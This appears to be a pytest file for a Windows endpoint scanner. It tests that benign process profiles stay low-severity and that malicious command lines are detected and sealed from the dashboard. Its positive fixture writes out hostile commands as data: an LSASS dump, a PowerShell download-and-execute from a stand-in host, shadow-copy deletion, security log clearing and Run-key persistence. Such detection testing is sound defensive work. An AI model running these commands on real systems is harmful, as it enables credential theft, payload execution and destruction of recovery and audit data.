"""Synthetic Windows calibration and sealed-report ingest regressions."""

from __future__ import annotations

import json

import pytest
from fastapi.testclient import TestClient

from wyndoze_infoscanoverload.agent.cmdline import seal_command_lines
from wyndoze_infoscanoverload.agent.crypto import generate_key
from wyndoze_infoscanoverload.core.models import (
    CollectionHealth,
    EndpointRole,
    ListeningConnection,
    PlatformInfo,
    ProcessInfo,
    ScanReport,
    ServiceInfo,
    SoftwareInfo,
)
from wyndoze_infoscanoverload.core.rulepacks import default_rule_pack
from wyndoze_infoscanoverload.core.rules import evaluate
from wyndoze_infoscanoverload.server.app import create_app
from wyndoze_infoscanoverload.server.config import ServerConfig

_BEHAVIORS = {
    "cmd-credential-dump",
    "cmd-download-execute",
    "cmd-recovery-inhibition",
    "cmd-eventlog-clear",
    "cmd-autorun-modification",
}


def _process(name: str, line: str, pid: int = 100) -> ProcessInfo:
    return ProcessInfo(pid=pid, create_time=1792368000.0, name=name, cmdline=line)


@pytest.fixture(params=["workstation", "developer", "backup", "dc", "jumpbox", "rmm"])
def benign_windows_report(request: pytest.FixtureRequest) -> ScanReport:
    """Representative benign metadata, never a scan of the developer's host."""
    report = ScanReport(
        hostname=f"synthetic-{request.param}",
        scan_time_utc="2026-10-19T00:00:00Z",
        role=EndpointRole.WORKSTATION,
        platform=PlatformInfo(system="Windows", release="2022"),
        services=[
            ServiceInfo(name="EventLog", state="running"),
            ServiceInfo(name="WinDefend", state="running"),
            ServiceInfo(name="VSS", state="stopped"),
        ],
        collection_health={"services": CollectionHealth(item_count=3)},
        local_admins=["Administrator"],
    )
    match request.param:
        case "workstation":
            report.processes = [
                _process("procdump.exe", "procdump.exe -ma notepad.exe app.dmp"),
                _process("encoder.exe", "encoder.exe -enc utf8 input.txt", 101),
                _process(
                    "reg.exe",
                    r"reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
                    102,
                ),
            ]
            report.listening_connections = [
                ListeningConnection(local_ip="127.0.0.1", local_port=4444, pid=101)
            ]
        case "developer":
            report.processes = [
                _process(
                    "powershell.exe",
                    "powershell.exe -ExecutionPolicy Bypass -File inventory.ps1",
                ),
                _process(
                    "pwsh.exe",
                    "pwsh.exe -Command Invoke-WebRequest https://example.invalid/pkg -OutFile pkg",
                    101,
                ),
            ]
        case "backup":
            report.role = EndpointRole.BACKUP_SERVER
            report.processes = [
                _process("vssadmin.exe", "vssadmin.exe list shadows"),
                _process("wevtutil.exe", "wevtutil.exe epl Security security.evtx", 101),
                _process("bcdedit.exe", "bcdedit.exe /enum", 102),
            ]
        case "dc":
            report.role = EndpointRole.DOMAIN_CONTROLLER
            report.processes = [
                _process(
                    "ntdsutil.exe", 'ntdsutil.exe "activate instance ntds" files info quit quit'
                )
            ]
        case "jumpbox":
            report.role = EndpointRole.JUMPBOX
            report.installed_software = [SoftwareInfo(name="PuTTY"), SoftwareInfo(name="WinSCP")]
            report.listening_connections = [
                ListeningConnection(local_ip="0.0.0.0", local_port=3389, pid=100)  # noqa: S104 - data
            ]
        case "rmm":
            report.processes = [_process("anydesk.exe", '"C:\\Program Files\\AnyDesk.exe"')]
            report.installed_software = [SoftwareInfo(name="AnyDesk")]
            report.services += [ServiceInfo(name="AnyDesk", state="running")]
            # Passive/replaced protection cannot establish tampering from this service alone.
            report.services[1].state = "stopped"
    report.collection_health["services"].item_count = len(report.services)
    return report


def test_benign_windows_profiles_remain_observations(benign_windows_report: ScanReport) -> None:
    seal_command_lines(benign_windows_report, generate_key())
    findings = evaluate(benign_windows_report, default_rule_pack())
    assert not any(finding.rule_id in _BEHAVIORS for finding in findings)
    affected = _BEHAVIORS | {
        "cmd-suspicious-line",
        "proc-credential-dumping",
        "proc-diagnostic-admin",
    }
    assert not any(
        f.rule_id in affected and f.severity.value in {"high", "critical"} for f in findings
    ), findings


def test_contextual_findings_survive_sealed_ingest_and_preserve_decisions(tmp_db) -> None:
    report = ScanReport(
        hostname="synthetic-positive",
        scan_time_utc="2026-10-19T00:00:00Z",
        processes=[
            _process("procdump64.exe", "procdump64.exe -ma lsass.exe sensitive.dmp"),
            _process(
                "powershell.exe",
                "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString"
                "('https://example.invalid/synthetic-payload')",
                101,
            ),
            _process("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", 102),
            _process("wevtutil.exe", "wevtutil.exe cl Security", 103),
            _process(
                "reg.exe",
                r"reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\Run "
                r'/v Synthetic /d "C:\synthetic.exe" /f',
                104,
            ),
        ],
    )
    seal_command_lines(report, generate_key())
    wire = report.model_dump_json()
    assert "synthetic-payload" not in wire
    config = ServerConfig(
        db_path=tmp_db,
        ingest_token="synthetic-ingest",  # noqa: S106 - disposable test secret
        dashboard_password="synthetic-dashboard",  # noqa: S106 - disposable test secret
    )
    auth = ("admin", "synthetic-dashboard")
    with TestClient(create_app(config)) as client:
        headers = {"Authorization": "Bearer synthetic-ingest"}
        response = client.post("/api/scans", content=wire, headers=headers)
        assert response.status_code == 201, response.text
        rows = client.get("/export/findings.json", auth=auth).json()
        assert {row["rule_id"] for row in rows} >= _BEHAVIORS
        row = next(row for row in rows if row["rule_id"] == "cmd-credential-dump")
        flagged = client.post(f"/findings/{row['id']}/flag", auth=auth, follow_redirects=False)
        assert flagged.status_code == 303
        assert client.post("/api/scans", content=wire, headers=headers).status_code == 201
        repeated = client.get("/export/findings.json", auth=auth).json()
        hit = next(item for item in repeated if item["id"] == row["id"])
        assert hit["status"] == "flagged"
        assert hit["seen_count"] == 2
        stored = client.app.state.storage.get_scan(1)
        restored = ScanReport.model_validate_json(stored["raw_json"])
        assert restored.processes[0].pid == 100
        assert restored.processes[0].create_time == report.processes[0].create_time
        assert set(restored.processes[0].cmdline_flags) >= {"dump-operation", "sensitive-target"}
        page = client.get("/scans/1", auth=auth)
        assert page.status_code == 200
        assert "eventlog-clear" in page.text
        assert "synthetic-payload" not in page.text
        assert "synthetic-payload" not in json.dumps(rows)
        for proc in report.processes:
            assert proc.cmdline is not None
            assert proc.cmdline not in page.text
